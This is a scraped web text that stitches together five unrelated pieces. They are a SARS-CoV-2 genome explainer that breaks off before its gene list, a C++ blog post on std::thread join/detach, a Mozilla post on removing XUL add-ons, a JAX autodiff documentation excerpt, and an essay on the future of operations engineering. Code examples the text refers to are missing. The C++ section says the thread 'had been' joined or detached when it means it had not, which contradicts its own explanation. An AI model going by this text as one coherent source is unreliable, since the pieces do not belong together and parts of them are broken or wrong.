<p>Here, I aim to provide a <em>mechanistic explanation</em> of the SARS-CoV-2 genome’s syntax and semantics. Let’s investigate what the SARS-CoV-2 viral genome actually does as if reading through code like a compiler, from nucleotides to amino acids all the way to proteins. From the four base pairs all the way up to the completed protein-coated virus, what is a virus like this is actually made of on the concrete, physical level?</p>

<h3 id="understanding-a-full-system">Understanding a Full System</h3>

<p>The underlying purpose of this essay is less about the coronavirus <em>per se</em> and more about how having a small—but functionally complete—piece of viral RNA to analyze gives me a unique opportunity to try to understand a complete self-replicating machine from scratch. This is not a feat that I would have the fortitude to manually replicate with the full human genome, for example—but the coronavirus genome, like the <a href="http://openworm.org/">nematode genome</a>, is small enough that we stand a chance at building a complete understanding. The task is perhaps akin to <a href="https://distill.pub/2018/building-blocks/">interpretability</a>, but for biological systems instead of artificial neural networks.</p>

<p>As a consequence, this essay is not intended to produce epidemiological conclusions; there are plenty of other sources for that! This essay is about fully understanding a biological system at the chemical and physical level.</p>

<h3 id="play-curiosity-and-mechanical-understanding">Play, Curiosity, and Mechanical Understanding</h3>

<p>Throughout this essay, I follow my curiosity in the style of <a href="https://en.wikipedia.org/wiki/Serious_play">serious play</a>: if I <a href="https://www.readthesequences.com/Noticing-Confusion-Sequence">notice I’m confused</a> about something, I look into it and explore it until I’m satisfied that I now understand, and that my understanding is <em>a <a href="https://plato.stanford.edu/entries/science-mechanisms/#ConMec">mechanical</a> understanding</em>. Things are made of stuff! It turns out that we can understand that stuff!</p>

<p>I may skip over some details that were not confusing to me during my own research, but your journey need not be the same as mine. If you’re confused about something while reading this essay, I encourage you to go and look it up! <a href="http://agentyduck.blogspot.com/2015/06/the-art-of-noticing.html">Notice</a> when your curiosity arises; that’s the meditation. Together, we can <a href="http://samoburja.com/how-to-find-the-frontier-of-knowledge/">learn new things</a>.</p>

<p>This all, at least, has been my intention as I set out to create this piece! As Ken Liu said of his philosophy while translating The Three-Body Problem, “I may not have succeeded, but these were the standards I had in mind as I set about my task.”</p>

<p>Part 1, here, covers just the genome and its translation to proteins. I hope to also write a Part 2 which would cover the structure and function of those proteins, their protein-protein interactions, and the full viral life cycle.</p>

<!--Finally, as you may already be able to tell, this essay also serves as a philosophical manifesto-by-example of how to think concretely about problems in biology. Along the way, I give some of my thoughts about the role of thermodynamics in molecular biology, legibility in complex systems, pedagogy, and the future of computational modeling.-->

<p>Let’s get started.</p>



<p>As a reminder, SARS-CoV-2 is a <em>positive-sense single-stranded RNA virus</em>.</p>



<p>What does this mean we can expect?</p>

<ol>
  <li><em>Single-stranded</em>: Its genome is a single strand of <a href="https://en.wikipedia.org/wiki/RNA">RNA</a> (ssRNA).</li>
  <li><em>Positive-sense</em>: That single strand of RNA can be immediately translated into protein by the ribosomes of the cell it infects.</li>
</ol>

<p>From this we can also infer that one of the proteins the virus encodes for must be <em>RNA-dependent RNA polymerase</em> (RdRP), a protein which synthesizes new RNA given an RNA template. That’s right: RNA → RNA. However, according to the <a href="https://en.wikipedia.org/wiki/Central_dogma_of_molecular_biology">central dogma of molecular biology</a>, isn’t RNA → RNA an unconscionable heresy? Correspondingly, RdRP is not naturally found in cells! All known positive-sense ssRNA viruses therefore <em>must encode</em> RdRP in order to successfully commit this heresy.</p>



<p>…Wait a minute, the phrase “positive-sense ssRNA virus” implies the existence of <em>negative-sense</em> viruses. If those don’t encode their proteins directly, how can they possibly work?</p>

<h2 id="positive-sense-and-negative-sense">Positive sense and negative sense</h2>

<p>Negative-sense ssRNA viruses also exist! Influenza, Ebola, and measles are examples.</p>



<p>The inner contents of <em>negative-sense</em> ssRNA viruses consist not of an RNA genome but of a <em>ribonucleoprotein</em>, which incorporates both an RNA genome as well as a cohort of viral proteins capable of replicating RNA. Unlike positive-sense ssRNA viruses, negative-sense ssRNA viruses must travel with a working copy of their RNA-replicating proteins. This ribonucleoprotein has enzymatic activity!</p>

<h2 id="rdrp-as-drug-target">RdRP as drug target</h2>

<p>Since RdRP has (as far as I know) no legitimate purpose in human cells and is not naturally coded by them, might it offer a potential target for novel antiviral drugs?</p>

<p><a href="https://pubmed.ncbi.nlm.nih.gov/24102407/">Velkov et al. 2014</a> explores RdRP as a drug target for antivirals against the <a href="https://en.wikipedia.org/wiki/Henipavirus">Hendra virus</a>, a negative-sense ssRNA virus, though I am unable to find the full text.</p>

<!-- <div class="unfurl-embed-info-media-default gallery-item-selectable"><img class="unfurl-embed-card-feature-image" src="https://cdn.ncbi.nlm.nih.gov/pubmed/persistent/pubmed-meta-image.png"><div class="unfurl-embed-card-title unfurl-embed-card-title-default notranslate"><a href="https://pubmed.ncbi.nlm.nih.gov/24102407/">The RNA-dependent-RNA Polymerase, an Emerging Antiviral Drug Target for the Hendra Virus - PubMed</a></div><div class="unfurl-embed-card-description unfurl-embed-card-description-default notranslate"><div style="overflow: hidden; text-overflow: ellipsis; -webkit-box-orient: vertical; display: -webkit-box; -webkit-line-clamp: 2;">Australia is facing a major national medical challenge with the emergence of the Hendra virus (HeV) as a medically and economically important pathogen of humans and animals.

<blockquote>
  <p>This review examines the current knowledge based on the multi-domain architecture of the Hendra RdRP and highlights which essential domain functions represent tangible targets for drug development against this deadly disease.</p>
</blockquote>

<p>There must be some reason that developing antivirals against this protein is technically (or socially) complicated, or I’d have expected us to do it by now – there are a lot of RNA viruses that this drug target could theoretically hit. Flagging this discrepancy for further research.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">1</a></sup></p>



<p>Back to SARS-CoV-2! First, let’s get us a genome. Obviously this virus has seen some mutations as it’s spread around, as you can explore at <a href="https://nextstrain.org/ncov/global">NextStrain</a>, so we’ve technically got choices as to which one to analyze. For this thread I’ll just stick to analyzing <em>one</em> version of the genome: Wuhan-Hu-1.</p>

<p>As a reminder, each <code>A</code>, <code>G</code>, <code>C</code>, and <code>T</code> in a genome is one of the four <a href="https://en.wikipedia.org/wiki/Nucleotide">nucleotides</a>: <a href="https://en.wikipedia.org/wiki/Adenine">adenine</a>, <a href="https://en.wikipedia.org/wiki/Guanine">guanine</a>, <a href="https://en.wikipedia.org/wiki/Cytosine">cytosine</a>, and <a href="https://en.wikipedia.org/wiki/Thymine">thymine</a>. There are actually <a href="https://www.scripps.edu/romesberg/publications.html">plenty of ways to engineer</a> different <a href="https://pubmed.ncbi.nlm.nih.gov/22850726/">unnatural base pair systems</a> by adding <a href="https://science.sciencemag.org/content/363/6429/884">artificial nucleotides</a>, and these can even be integrated into <a href="https://www.pnas.org/content/98/9/4922">transcription</a> and <a href="https://www.nature.com/articles/nature24659">translation</a>, but <a href="https://carlbrannen.wordpress.com/2007/06/13/why-does-dna-only-use-4-nucleotides/">for</a> <a href="https://dreamerbiologist.wordpress.com/2013/02/16/why-did-nature-settle-on-just-four-nucleotides/">whatever</a> <a href="https://www.pnas.org/content/114/32/E6476">reason</a>, these four <a href="https://www.nature.com/articles/s41467-018-07389-2">and not others</a> are <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3331698/">what life ultimately ended up with</a>.</p>

<p><img src="https://csvoss.com/images/nucleotides.png"></p>
<p><small>The four nucleotides in DNA.</small></p>

<p>The genome of Wuhan-Hu-1 is available from <a href="https://www.ncbi.nlm.nih.gov/nuccore/MN908947.3">NCBI GenBank</a>. Since SARS-CoV-2 is an RNA virus, each <code>T</code> in this string technically represents a <code>U</code>, for <a href="https://en.wikipedia.org/wiki/Uracil">uracil</a>, RNA’s information-equivalent of thymine. The genome sequence is therefore:</p>

<div><div><pre><code>1     AUUAAAGGUU UAUACCUUCC CAGGUAACAA ACCAACCAAC UUUCGAUCUC UUGUAGAUCU
61    GUUCUCUAAA CGAACUUUAA AAUCUGUGUG GCUGUCACUC GGCUGCAUGC UUAGUGCACU
121   CACGCAGUAU AAUUAAUAAC UAAUUACUGU CGUUGACAGG ACACGAGUAA CUCGUCUAUC

...

29761 ACAGUGAACA AUGCUAGGGA GAGCUGCCUA UAUGGAAGAG CCCUAAUGUG UAAAAUUAAU
29821 UUUAGUAGUG CUAUCCCCAU GUGAUUUUAA UAGCUUCUUA GGAGAAUGAC AAAAAAAAAA
29881 AAAAAAAAAA AAAAAAAAAA AAA
</code></pre></div></div>

<p><a target="blank" href="https://benchling.com/s/seq-28k9llmwnY475iv7ogwF/edit">Follow along with the genome »</a></p>

<p>That’s 29,903 nucleotides. Since there are only four possible nucleotides, we can estimate the information compression value of each nucleotide at approximately 2 bits; the virus’s genome therefore requires only 7.5 kilobytes to store. That’s roughly as much data, byte for byte, as there are characters in this essay up to this point!</p>

<p>Lay out those 29,903 nucleobases along a ribose-phosphate backbone, reading them left to right <a href="https://en.wikipedia.org/wiki/Directionality_(molecular_biology)">from the 5’ end to the 3’ end</a>, and bam – if that single molecule* were teleported into a cell, that’s 100% chemically sufficient** to infect a person with the plague du jour.</p>

<p><small>How to interpret the Wuhan-Hu-1 genome as a complete molecule.</small></p>

<h2 id="poly-a-tail">Poly-A tail</h2>

<p>First question, and perhaps the most obvious one to the naked eye – what’s with all the <code>AAAAA</code> at the end of the viral genome?</p>

<div><div><pre><code>29821 ...                                                ... AAAAAAAAAA

</code></pre></div></div>
<p><a target="blank" href="https://benchling.com/s/seq-28k9llmwnY475iv7ogwF/edit">Follow along with the genome »</a></p>

<p>It’s… yelling at us? Is it… suffering? Should we <a href="https://reducing-suffering.org/is-there-suffering-in-fundamental-physics/">help</a>?</p>

<p>Simple: It’s a <a href="https://bioinformatics.stackexchange.com/questions/11227/why-does-the-sars-cov2-coronavirus-genome-end-in-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">3’ poly-A tail</a>! This <a href="https://en.wikipedia.org/wiki/Polyadenylation">long tail of adenosine monomers</a> is extremely common in both our own cells and in RNA viruses.</p>

<p>Our own messenger RNA (mRNA) has a poly-A tail when it’s freshly produced in the nucleus so as to slow its degradation by the cell, allowing it to last long enough to be transcribed into protein. Naturally, if you’re a positive-strand RNA virus, you’re also going to want to last long enough to be transcribed into protein – so, you need the same feature, yourself.</p>

<p>Genome 0.11% explained. So far so good!</p>

<h2 id="5-cap">5’ cap</h2>

<p>While we’re discussing chemical features of mRNA, note that the viral genome presumably must also have a <a href="https://en.wikipedia.org/wiki/Five-prime_cap">5’ cap</a> – an extra <a href="https://en.wikipedia.org/wiki/7-Methylguanosine">7-methylguanosine</a> at the 5’ end of its RNA strand – just like mRNAs do.</p>

<p><img src="https://csvoss.com/images/5primecap.png"></p>
<p><small>A 5' cap, consisting of a 7-methylguanosine as well as methylation of the first two ribose sugars.</small></p>

<p>The cap is not directly shown in the viral genome sequence or mentioned in NCBI GenBank, but it is referenced in multiple papers discussing coronaviral genomes:</p>

<blockquote>
  <p>Since 2003, the outbreak of severe acute respiratory syndrome coronavirus has drawn increased attention and stimulated numerous studies on the molecular virology of coronaviruses. Here, we review the current understanding of the mechanisms adopted by coronaviruses to produce the 5′-cap structure and methylation modification of viral genomic RNAs.</p>
</blockquote>



<blockquote>
  <p>Coronaviruses possess a cap structure at the 5′ ends of viral genomic RNA and subgenomic RNAs, which is generated through consecutive methylations by virally encoded guanine-N7-methyltransferase (N7-MTase) and 2′-O-methyltransferase (2′-O-MTase). The coronaviral N7-MTase is unique for its physical linkage with an exoribonuclease (ExoN) harbored in nonstructural protein 14 (nsp14) of coronaviruses.</p>
</blockquote>



<blockquote>
  <p>Here, we have reconstituted complete SARS-CoV mRNA cap methylation <em>in vitro</em>.</p>
</blockquote>



<p>Like the poly-A tail, the 5’ cap helps the genome to be recognized and translated by ribosomes rather than destroyed by the cell’s immune response.</p>

<p>How does the virus even ensure that it receives a 5’ cap and a poly-A tail, not to mention its outer coat? Hopefully these questions will be resolved by our review of its genes and proteins… let’s move on to look at those!</p>



<p>Per the “Features” section of the genome, again from <a href="https://www.ncbi.nlm.nih.gov/nuccore/MN908947.3">NCBI GenBank</a>, here are the identifiable genes in this genome, in order:</p>

      <h3 id="introduction">Introduction</h3>

<p>When we write multithread C++ programs, we might be curious why we always have to call <code>join()</code> or <code>detach()</code> for the new threads. In some scenarios, if we forgot to call <code>join()</code> or <code>detach()</code> for the new threads, there might be peculiar program crashes which are hard to troubleshoot.</p>



<p>In this blog post, I would like to discuss the consequence of not calling <code>join()</code> or <code>detach()</code> for the new threads, and some of the methods that could make sure that <code>join()</code> or <code>detach()</code> for the new threads are always called.</p>

<h3 id="consequences-for-no-join-or-detach">Consequences for No Join or Detach</h3>

<p>The consequence of not calling <code>join()</code> or <code>detach()</code> for the new threads is program termination due to <a href="https://en.cppreference.com/w/cpp/error/terminate"><code>std::terminate</code></a> was called.</p>



<p>Let’s check the following example. The main function in the main thread instantiated a <code>new_thread</code> which sleeps 5 seconds, then the main thread itself sleeps 1 second before it goes out of the scope.</p>

<p>We compiled the program using the following command.</p>

<div><div><pre><code>$ g++ -std=c++14 example.cpp -lpthread -o example
</code></pre></div></div>

<p>When we executed the program, the program crashed.</p>

<div><div><pre><code>$ ./example
Thread 139772469839680 sleeping for 1 seconds ...
Thread 139772469835520 sleeping for 5 seconds ...
Thread 139772469839680 sleeping complete! 
terminate called without an active exception
Aborted (core dumped)
</code></pre></div></div>

<p>This is because, when the execution of the main function finished, the destructor of <code>new_thread</code> will be automatically called for garbage collection. In the description of the destructor <a href="https://en.cppreference.com/w/cpp/thread/thread/~thread"><code>std::thread::~thread</code></a>, If <code>*this</code> has an associated thread (<code>joinable() == true</code>), <code>std::terminate()</code> is called. If the <code>std::thread</code> object has been called with <code>join()</code> or <code>detach()</code>, <code>joinable()</code> would become <code>false</code>, otherwise it is always <code>true</code>. Because <code>new_thread</code> had been called with <code>join()</code> or <code>detach()</code> before its destructor was called, <code>joinable()</code> was <code>true</code> and <code>std::terminate()</code> was called and the C++ runtime was killed.</p>



<p>Although it terminates the program brutally, such design has its rationale. Without the <code>std::terminate()</code> mechanism in the destructor <code>std::thread::~thread</code>, if the users wanted to do <code>join()</code>, but forgot to call <code>join()</code>, the <code>new_thread</code> will run in the background just like the <code>detach()</code> behaviors. This might cause undefined behaviors.</p>

<h3 id="caveats">Caveats</h3>

<p>In addition to forget writing <code>join()</code> or <code>detach()</code> in the code, which is easy to find out, sometimes we have written <code>join()</code> or <code>detach()</code> in the code but they were not called due to exceptions. This will also results in program crash and might be difficult to troubleshoot.</p>



<p>The most conventional way is to add <code>join()</code> or <code>detach()</code> in the <code>catch</code> block.</p>

<p>There are other ways to deal with the thread issue, such as using RAII.</p>



<p>We could create an instance of <code>ThreadGuard</code> right after the <code>std::thread</code> object is created. This instance of <code>ThreadGuard</code> would make sure the <code>std::thread</code> object always call <code>join()</code> or <code>detach()</code> before going out of scope.</p>

<h3 id="notes">Notes</h3>

<p>Although program termination during C++ program development and test helps us to find out the missing <code>join()</code> and <code>detach()</code> during runtime, if the program is not well tested and the missing <code>join()</code> and <code>detach()</code> go into the deployment, it will be a big headache to realize. We don’t want our program to crash during deployment! Try to think of all the possible scenarios, catch the exceptions and deal with them appropriately!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>TL;DR: Firefox used to have a great extension mechanism based on the XUL and XPCOM. This mechanism served us well for a long time. However, it came at an ever-growing cost in terms of maintenance for both Firefox developers and add-on developers. On one side, this growing cost progressively killed any effort to make Firefox secure, fast or to try new things. On the other side, this growing cost progressively killed the community of add-on developers. Eventually, after spending years trying to protect this old add-on mechanism, Mozilla made the hard choice of removing this extension mechanism and replacing this with the less powerful but much more maintainable WebExtensions API. Thanks to this choice, Firefox developers can once again make the necessary changes to improve security, stability or speed.</p>

<p>During the past few days, I’ve been chatting with Firefox users, trying to separate fact from rumor regarding the consequences of the August 2020 Mozilla layoffs. One of the topics that came back a few times was the removal of XUL-based add-ons during the move to Firefox Quantum. I was very surprised to see that, years after it happened, some community members still felt hurt by this choice.</p>

<p>And then, as someone pointed out on reddit, I realized that we still haven’t taken the time to explain in-depth why we <em>had no choice</em> but to remove XUL-based add-ons.</p>

<p>So, if you’re ready for a dive into some of the internals of add-ons and Gecko, I’d like to take this opportunity to try and give you a bit more detail.</p>



<p>For a very long time, Firefox was composed of a very small core on top of which everything was implemented as extensions. Many of these extensions were written in C++, others in JavaScript and many involved the XUL interface language and the XBL binding language. C++ and JavaScript code were connected thanks to a technology called XPCOM. Whenever an extension developer wished to customize Firefox, it was simple and extremely powerful, as the exact same building blocks used to power Firefox could be used to customize it.</p>

<p>This is how Session Restore (the technology that lets you resume Firefox where you left it the last time, even in case of crash) or the Find Bar were first implemented in Firefox, among other features. This is the technology that powers Firefox and <a href="https://www.thunderbird.net/">Thunderbird</a>. This is how tools such as <a href="https://en.wikipedia.org/wiki/Songbird_(software)">Songbird</a> (an open-source iTunes competitor) or <a href="https://en.wikipedia.org/wiki/Instantbird">Instantbird</a> (a chat client) were developed. This is also how I customized Firefox to become an eBook reader a long time ago. And this is how thousands of Firefox add-ons were developed.</p>

<p>Many people call this extension mechanism “XUL-based Add-Ons”, or sometimes “XPCOM-based Add-Ons”, and I’ll use both terms in this blog entry, but I often think of this as the “Promiscuous Extension Mechanism”, for several reasons:</p>

<ul>
<li>very quickly, add-on developers realized that anything they did could break anything else in the system, including other add-ons and Firefox itself, and they often had no way to prevent this;</li>
<li>similarly, anything Firefox developers did could break add-ons, and they often had no way to prevent this;</li>
<li>also, some of the changes that Firefox needed to be as fast, as stable and as secure as possible were going to break most add-ons immediately, possibly all add-ons in the longer term;</li>
<li>oh, and by the way, since add-ons could do everything, they could very easily do anything to the operating system, from stealing passwords to pretending to be your bank.</li>
</ul>

<p>Note: Having read in comments that some users apparently do not care about security, let me add that being secure is a really, really important point for Mozilla and has been since the first day. Regardless of add-ons, <em>not</em> having security means that an exploit is eventually going to show up that will steal user’s passwords and use them to steal their bank accounts – and that exploit will get sold around and will soon show up everywhere. Firefox developers fight this threat daily by all sorts of means, including code reviews, defensive programming, crash scene investigations, several types of sandboxing, static analysis, memory-safe languages, … Consequently, for Mozilla, if a feature prevents us from achieving great security, we <em>always</em> pick security over features.</p>

<p>I’ll return to these points in more details later. For the moment, suffices to say that it had been clear to Firefox developers for a long time (at least since 2010) that this situation was untenable. So Mozilla came up with a backup plan called the <em>Firefox Jetpack</em>.</p>

<p>Firefox Jetpack was a very different manner of extending Firefox. It was much cleaner. It finally had a permissions mechanism (something that had been suggested even before Firefox was called Firefox and that was generally considered too hard to implement). Out of the box, add-ons could not break each other or Firefox (I seem to remember that it was still sometimes possible by exploiting the observer service, but you had to work hard at it), it made extensive use of async programming (which was great to achieve a feeling of high-performance) and thanks to the fact that it had a finite API, it could be tested, which meant that when Firefox developers broke add-ons, they knew about it immediately and could fix the breakages! That was several enormous steps forward. This came at the cost of a more limited API but in most cases, the tradeoff seemed worth it.</p>

<p>Unfortunately, it turned out that there was an unexpected incompatibility between the design of Jetpack and some of the major changes that were needed in Firefox. I’m not entirely clear about what this incompatibility was but this meant that we had to abandon Jetpack.
Instead, we introduced WebExtensions. Overall, WebExtensions had a similar objective as Jetpack-based add-ons, with a similarly restricted API and the added bonus that they could be made to work on both Chromium-based browsers and Firefox.</p>

<p>If you needed very advanced APIs, switching from the promiscuous extension mechanism to Jetpack or WebExtensions was not always possible, but for most extensions, the transition was simple – in my personal experience, it was even pleasant.</p>

<p>Firefox introduced WebExtensions in time for Firefox Quantum because this is when the promiscuous add-on model was scheduled to break.</p>

<p>At this stage, we’re done with the historical overview. I hope you’re ready for a more technical dive because that’s how I’m going to explain to you exactly which problems were solved as we switched from the promiscuous extension model to WebExtensions.</p>



<h2 id="how-it-started">How it started</h2>

<p>XPCOM, the Xross-Platform Component Object Model, is perhaps the feature of Firefox that can best be described as <em>the core</em> (for people who know Gecko in-depth, I’m counting XPConnect and the Cycle Collector as part of XPCOM), alongside SpiderMonkey, our JavaScript Virtual Machine.</p>

<p>XPCOM is a technology that lets you write code in two languages and have each other call the other. The code of Firefox is full of C++ calling JavaScript, JavaScript calling C++ and a long time ago, we had projects that added Python and .Net in the mix. This piece of machinery is extremely complicated because languages do not share the same definitions (what’s a 64-bit integer in JavaScript? what’s a JavaScript exception in C++?) or the same memory model (how do you handle a JavaScript object holding a reference to a C++ object that C++ might wish to <code>delete</code> from memory?) or the same concurrency model (JavaScript workers share nothing while C++ threads share everything).</p>

<p>Gecko itself was originally designed as thousands of XPCOM components that could each be implemented in C++ or in JavaScript, tested individually, plugged, unplugged or replaced dynamically and <em>it worked</em>. In addition, the XPCOM architecture made for much cleaner C++ programming than was available at the time, worked on dozens of platforms, and let us combine the convenience of writing code in JavaScript and the raw speed permitted by C++.</p>

<p>To write a XPCOM component, you typically define <a href="https://searchfox.org/mozilla-central/rev/6cc48251bb97600fdf11a5b4c5f621bfc8606d55/dom/interfaces/base/nsIFocusManager.idl">an interface</a>, then write the implementation in either C++ or JavaScript (or Rust, nowadays, and maybe soon Wasm). Some boilerplate is needed, but hey, it works.</p>

<p>When early Firefox developers decided to open the platform to extensions, XPCOM was immediately picked as the base technology for add-ons. Firefox just had to let add-on authors plug anywhere within the code and they would have tremendous power at their disposal.</p>

<p>And add-on developers (including myself) certainly did and had lots of fun with it!</p>

<h2 id="the-era-of-immutable-xpcom">…the era of immutable XPCOM</h2>

<p>Unfortunately, problems progressively started to creep up.</p>

<p>When you’re developing a large application, you need to change things, either to fix bugs or to add new features, or to improve performance. In the XPCOM world, this meant changing XPCOM components. Sometimes to add new features to a component. Sometimes to entirely remove one because this design has been replaced with a better design.</p>

<p>In the first era of the XPCOM-based extension mechanism, this was often forbiddden. If there was an XPCOM component used by add-ons, it simply <strong>could not</strong> be changed in incompatible ways. This was great for add-on developers but it quickly became a nightmare for Firefox developers. Because every single change had to be made in backwards-compatible way both externally (for web developers) and internally (for add-on developers). This meant that each XPCOM component <code>nsISomething</code> was quickly accompanied by a <code>nsISomething2</code>, which was the better component – and both needed to be made to work alongside each other - One case was even more complicated to handle by Firefox developers: XPCOM-based add-ons could replace <em>any existing XPCOM component</em>. Needless to say, this was a very good way to break Firefox in ways that puzzled Firefox crash investigators.</p>

<p>This meant that development became slower and slower as we needed to check each new feature or each improvement against not only current features, but also past/deprecated features or simply old ways to work …</p></article></div>

<p><code><span>grad</span></code> takes a function and returns a function. If you have a Python function <code><span>f</span></code> that evaluates the mathematical function <span>\(f\)</span>, then <code><span>grad(f)</span></code> is a Python function that evaluates the mathematical function <span>\(\nabla f\)</span>. That means <code><span>grad(f)(x)</span></code> represents the value <span>\(\nabla f(x)\)</span>.</p>
<p>Since <code><span>grad</span></code> operates on functions, you can apply it to its own output to differentiate as many times as you like:</p>

<p>This <code><span>grad</span></code> API has a direct correspondence to the excellent notation in Spivak’s classic <em>Calculus on Manifolds</em> (1965), also used in Sussman and Wisdom’s <a href="http://mitpress.mit.edu/sites/default/files/titles/content/sicm_edition_2/book.html">*Structure and Interpretation of Classical Mechanics*</a> (2015) and their <a href="https://mitpress.mit.edu/books/functional-differential-geometry">*Functional Differential Geometry*</a> (2013). Both books are open-access. See in particular the “Prologue” section
of <em>Functional Differential Geometry</em> for a defense of this notation.</p>
<p>Essentially, when using the <code><span>argnums</span></code> argument, if <code><span>f</span></code> is a Python function for evaluating the mathematical function <span>\(f\)</span>, then the Python expression <code><span>grad(f,</span> <span>i)</span></code> evaluates to a Python function for evaluating <span>\(\partial_i f\)</span>.</p>

<h3>Hessian-vector products with <code><span>grad</span></code>-of-<code><span>grad</span></code><a href="#Hessian-vector-products-with-grad-of-grad" title="Permalink to this headline">¶</a></h3>
<p>One thing we can do with higher-order <code><span>grad</span></code> is build a Hessian-vector product function. (Later on we’ll write an even more efficient implementation that mixes both forward- and reverse-mode, but this one will use pure reverse-mode.)</p>
<p>A Hessian-vector product function can be useful in a <a href="https://en.wikipedia.org/wiki/Truncated_Newton_method">truncated Newton Conjugate-Gradient algorithm</a> for minimizing smooth convex functions, or for studying the curvature of neural network training objectives (e.g. <a href="https://arxiv.org/abs/1406.2572">1</a>, <a href="https://arxiv.org/abs/1811.07062">2</a>, <a href="https://arxiv.org/abs/1706.04454">3</a>, <a href="https://arxiv.org/abs/1802.03451">4</a>).</p>
<p>For a scalar-valued function <span>\(f : \mathbb{R}^n \to \mathbb{R}\)</span> with continuous second derivatives (so that the Hessian matrix is symmetric), the Hessian at a point <span>\(x \in \mathbb{R}^n\)</span> is written as <span>\(\partial^2 f(x)\)</span>. A Hessian-vector product function is then able to evaluate</p>
<p><span>\(\qquad v \mapsto \partial^2 f(x) \cdot v\)</span></p>
<p>for any <span>\(v \in \mathbb{R}^n\)</span>.</p>
<p>The trick is not to instantiate the full Hessian matrix: if <span>\(n\)</span> is large, perhaps in the millions or billions in the context of neural networks, then that might be impossible to store.</p>
<p>Luckily, <code><span>grad</span></code> already gives us a way to write an efficient Hessian-vector product function. We just have to use the identity</p>
<p><span>\(\qquad \partial^2 f (x) v = \partial [x \mapsto \partial f(x) \cdot v] = \partial g(x)\)</span>,</p>
<p>where <span>\(g(x) = \partial f(x) \cdot v\)</span> is a new scalar-valued function that dots the gradient of <span>\(f\)</span> at <span>\(x\)</span> with the vector <span>\(v\)</span>. Notice that we’re only ever differentiating scalar-valued functions of vector-valued arguments, which is exactly where we know <code><span>grad</span></code> is efficient.</p>
<p>In JAX code, we can just write this:</p>
<div>

<div><div><pre><span></span><span>def</span> <span>hvp</span><span>(</span><span>f</span><span>,</span> <span>x</span><span>,</span> <span>v</span><span>):</span>
    <span>return</span> <span>grad</span><span>(</span><span>lambda</span> <span>x</span><span>:</span> <span>jnp</span><span>.</span><span>vdot</span><span>(</span><span>grad</span><span>(</span><span>f</span><span>)(</span><span>x</span><span>),</span> <span>v</span><span>))(</span><span>x</span><span>)</span>
</pre></div>
</div>
</div>
<p>This example shows that you can freely use lexical closure, and JAX will never get perturbed or confused.</p>
<p>We’ll check this implementation a few cells down, once we see how to compute dense Hessian matrices. We’ll also write an even better version that uses both forward-mode and reverse-mode.</p>

<p>These two functions compute the same values (up to machine numerics), but differ in their implementation: <code><span>jacfwd</span></code> uses forward-mode automatic differentiation, which is more efficient for “tall” Jacobian matrices, while <code><span>jacrev</span></code> uses reverse-mode, which is more efficient for “wide” Jacobian matrices. For matrices that are near-square, <code><span>jacfwd</span></code> probably has an edge over <code><span>jacrev</span></code>.</p>
<p>You can also use <code><span>jacfwd</span></code> and <code><span>jacrev</span></code> with container types:</p>

				<div>
			<p><span>Infrastructure, ops, devops, systems engineering, sysadmin, infraops, SRE, platform engineering. As long as I’ve been doing computers, these terms have been effectively synonymous. If I wanted to tell someone what my job was, I could throw out any one of them and expect to be understood.</span></p>
<p><span>Every tech company had a software engineering team that built software and an operations team that built infrastructure for running that software. At some point in the past decade they would have renamed this operations team to “devops” or “SRE”, but whatever the name, that was my team and those were my people.</span></p>
<p><span>But unless you’re an infrastructure company, infrastructure is not your mission. Which means that every second you devote to infrastructure work — and every engineer you devote to infrastructure problems — is a distraction from your core goals.&nbsp;</span></p>
<p><span>What’s more, it’s a distraction that builds on itself. The more time and energy you spend on infrastructure, the more your focus gets scattered, and the more you deprive yourself of the time and energy that ought to be devoted to the problems your business exists to solve.</span></p>
<p><span>This isn’t exactly new. Infrastructure and operations have always been a distraction from your core business problems. It used to be the case that every company had to grow internal expertise in hardware, datacenters, networking, operating systems, config management, and so on up the tech stack until reaching their core business problems. Infrastructure and ops have always been a distraction, but until recently, a necessary one. A means to an end.</span></p>
<p><span>So what’s changed? These days, you increasingly have a choice. Sure, you </span><i><span>can</span></i><span> build all that internal expertise, but every day more and more of it is being served up via API on a silver platter.</span></p>
<p><span>Does this mean that operations is no longer important, no longer necessary? Far from it. Operations and operability are more important than ever. Let’s take a look at what’s happening to the ops profession at a high level, the emerging challenges we face, and the impact this’ll all have on our careers.&nbsp;</span></p>
<h3><b>Changes afoot</b></h3>
<p><span>Beyond the broader move into to cloud services, here are some of the major shifts on our horizon.</span></p>
<h5><b>From monolith to microservices</b></h5>
<p><span>Much has been written about the operational demands of a microservices architecture. Now that functions calling other functions involves a network hop, operational concerns are an unavoidable part of debugging even the most trivial problems. Microservices change the game from “building code” to “building systems”, which pushes more and more code writing into the realm of operations.</span></p>
<h5><b>From monitoring to observability</b></h5>
<p><span>Metric-based tools like Prometheus and DataDog are infrastructure monitoring tools, and quite good ones at that. When you’re responsible for infrastructure, the questions you care about are of aggregates and trends, thresholds and capacity. Monitoring tools are the right tool for the job, because that’s how you understand whether your infrastructure is healthy, and what actions to take to make it or keep it healthy.</span><span><br>
</span><span><br>
</span><span>Observability tools*, on the other hand, are for the people writing and shipping code to users every day, and trying to inspect and understand behavior at the nexus of users, production, and code. Observability tools preserve the full context of the request. This allows you to slice and dice and tease out new correlations, as well as view events in a waterfall by time (“tracing”). Observability is how you connect the dots between software and real business impact, and between your engineers’ experience and your users’ experience. </span><span><br>
</span><span><br>
</span><i><span>*Caution: many monitoring tools are trying to rebrand themselves as observability tools without first building the necessary functionality. To tell the difference, </span></i><a href="https://www.honeycomb.io/blog/so-you-want-to-build-an-observability-tool/"><i><span>see here</span></i></a><i><span>.</span></i></p>
<h5><b>From magic autoinstrumentation to instrumenting with intent</b></h5>
<p><span>Instrumentation is just another form of commenting and documenting your code. There are tools that promise to do it automatically for you, but they aren’t great at capturing intent.. Auto-instrumentation can tell you loads of ancillary details, but they will </span><i><span>never</span></i><span> let you divine the business value intended by the engineer who built it. So suck it up and instrument your code.</span></p>
<h3><b>Ops is dead. Long live ops.</b></h3>
<p><span>Ops teams are going the way of the dodo bird, yet operability, resiliency, and reliability have never been more important. The role of operations engineers is changing fast, and the role is bifurcating along the question of infrastructure. In the future, people who would formerly have called themselves “operations engineers” (or devops engineers) will get to choose between a role that emphasizes </span><i><span>building infrastructure software as a service </span></i><span>and a role that uses their infrastructure expertise to help teams of engineers ship software more effectively and efficiently…generally by building as little infrastructure as possible.</span></p>
